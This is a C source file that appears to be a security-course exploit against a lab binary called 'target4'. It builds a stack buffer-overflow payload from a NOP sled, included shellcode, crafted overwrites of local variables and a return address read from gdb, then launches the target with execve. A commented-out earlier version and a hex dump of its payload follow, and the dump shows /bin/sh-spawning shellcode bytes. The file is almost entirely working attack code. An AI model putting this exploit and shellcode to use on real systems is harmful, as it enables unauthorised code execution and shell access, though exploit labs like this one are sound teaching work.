#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*
  (gdb) p &buf
  $1 = (char (*)[156]) 0x3021fdf0
  (gdb) p &len
  $2 = (int *) 0x3021fe9c
  (gdb) p &i
  $3 = (int *) 0x3021fe98
*/

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[189];
  int i;

  // Fill up the buffer with NOP
  for (i = 0; i < 189; i++) {
      buf[i] = '\x90';
  }

  // Inject shellcode
  int shellcode_len = strlen(shellcode);
  for (int i = 0; i < shellcode_len; i++) {
      buf[i] = shellcode[i];
  }

  // i, pad \x01 because it should not be \x90 or \x00, so fill in small values
  buf[168] = '\xff';
  buf[169] = '\x01';
  buf[170] = '\x01';
  buf[171] = '\x01';

  // len
  buf[172] = '\xff';
  buf[173] = '\x01';
  buf[174] = '\x01';
  buf[175] = '\x01';

  // buffer
  buf[184] = '\xf0';
  buf[185] = '\xfd';
  buf[186] = '\x21';
  buf[187] = '\x30';

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return (0);
}

// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <unistd.h>
// #include "shellcode-64.h"

// #define TARGET "../targets/target4"
// #define LENGTH 169
// #define ADDR_LEN 4

// int main(void)
// {
//   char *args[3];
//   char *env[7];

//   char exploit[LENGTH] = "";

//   int i;
//   while(i < LENGTH / ADDR_LEN){
// 	  strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
// 	  i++;
//   }

//   strcat(exploit, "\x94\x00\x00\x00"); // i = 148 

//   for(i = 0; i < strlen(shellcode); i++){
//     exploit[i] = shellcode[i];
//   }

//   args[0] = TARGET; 
//   args[1] = exploit; 
//   args[2] = NULL;
  
//   env[0] = "\x00";
//   env[1] = "\x00";

//   env[2] = "\xa8\x00\x00\x00"; // len = 168
//   env[3] = "\x00";
//   env[4] = "\x00";
  
//   env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30";
//   env[6] = NULL;

//   print_argv(args, env);

//   if (0 > execve(TARGET, args, env))
//     fprintf(stderr, "execve failed.\n");

//   return 0;
// }

// Printing char *argv[]:
// argv[0] Printing Hex Code:
// \x2e\x2e\x2f\x74
// \x61\x72\x67\x65
// \x74\x73\x2f\x74
// \x61\x72\x67\x65
// \x74\x34\x00\x00
// 
// argv[1] Printing Hex Code:
// \xeb\x1f\x5e\x89
// \x76\x08\x31\xc0
// \x88\x46\x07\x89
// \x46\x0c\xb0\x0b
// \x89\xf3\x8d\x4e
// \x08\x8d\x56\x0c
// \xcd\x80\x31\xdb
// \x89\xd8\x40\xcd
// \x80\xe8\xdc\xff
// \xff\xff\x2f\x62
// \x69\x6e\x2f\x73
// \x68\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x50\xfe\x21\x30
// \x98\x00\x00\x00
// 
// Printing char *env[]:
// env[0] Printing Hex Code:
// 
// env[1] Printing Hex Code:
// 
// env[2] Printing Hex Code:
// \xa8\x00\x00\x00
// 
// env[3] Printing Hex Code:
// 
// env[4] Printing Hex Code:
// 
// env[5] Printing Hex Code:
// \xf0\xfd\x21\x30
// \xf0\xfd\x21\x30
// \xf0\xfd\x21\x30

